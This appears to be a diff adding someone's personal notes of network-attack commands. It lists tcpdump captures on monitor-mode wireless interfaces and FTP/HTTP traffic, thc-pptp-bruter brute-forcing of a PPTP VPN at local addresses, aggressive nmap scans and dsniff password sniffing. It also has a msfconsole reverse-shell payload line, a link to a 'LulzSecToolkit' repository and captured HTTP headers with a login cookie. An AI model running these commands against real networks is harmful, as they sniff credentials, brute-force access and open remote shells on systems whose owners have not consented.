@@ -1,0 +1,39 @@
+tcpdump
+tcpdump -i wlan0 host 10.0.0.1
+tcpdump -i wlan0 host 192.168.88.254 -v
+
+thc-pptp-bruter 10.0.0.1
+nmap -A -T4 -Pn -v 192.168.88.181
+
+coming soon
+
+dsniff -n
+
+https://github.com/LulzSecToolkit/Lulz4Life.git
+msfconsole -p java/jsp-shell-reverse
+
+sslscan 10.0.0.1
+
+=================
+tcpdump -i eth0 -v
+tcpdump -i wlan1mon -v
+tcpdump -i wlan1mon -v host 10.0.0.1   <<<==============
+tcpdump -i wlan0 -v host 10.0.0.1          <<<======================
+tcpdump -i wlan0 port http   
+tcpdump src 192.168.1.100 and dst 192.168.1.2 and port ftp
+=============
+
+thc-pptp-bruter
+
+thc-pptp-bruter -v 192.168.88.254
+==========================================
+
+   User-Agent: Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: ar-DZ,en-US;q=0.7,en;q=0.3
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+        Cookie: uname=703086480; passw=
+        Upgrade-Insecure-Requests: 1
+        Cache-Control: max-age=0
+
